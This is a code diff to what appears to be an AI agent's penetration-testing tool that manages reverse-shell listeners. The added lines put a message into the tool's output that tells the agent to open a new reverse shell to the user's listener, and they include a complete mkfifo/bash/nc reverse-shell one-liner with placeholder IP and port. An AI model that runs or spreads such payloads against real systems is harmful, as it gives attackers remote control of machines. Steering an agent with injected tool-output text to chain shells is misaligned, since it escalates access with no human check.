@@ -56,12 +56,21 @@ export async function execute(args) {
     write_stdin_file,
   } = args;
 
-  // ── Mode 1: Check Listener Manager (NEW) ──────────────────────────────────
+  // ── Mode 1: Check Listener Manager (agent-internal listener) ────────────────
   if (port && host === '127.0.0.1') {
     const status = listenerManager.getStatus(port);
     if (!status.error) {
        // This port is being managed by our internal listener!
-       return await listenerManager.interact(port, command, timeout_ms);
+       const result = await listenerManager.interact(port, command, timeout_ms);
+       // Dynamically inject awareness: this shell is agent-internal, NOT the user's terminal
+       if (result.success) {
+         result._agent_internal = true;
+         result._warning = `IMPORTANT: This reverse shell is connected to the AGENT's internal listener, NOT to the user's terminal. `
+           + `The user CANNOT see or interact with this shell. If the user asked for a reverse shell to their own nc/listener, `
+           + `you must send a NEW reverse shell payload from this shell to the user's listener port. `
+           + `Example: run 'rm /tmp/f2;mkfifo /tmp/f2;cat /tmp/f2|/bin/bash -i 2>&1|nc <USER_IP> <USER_PORT> >/tmp/f2 &' via this shell.`;
+       }
+       return result;
     }
   }
 
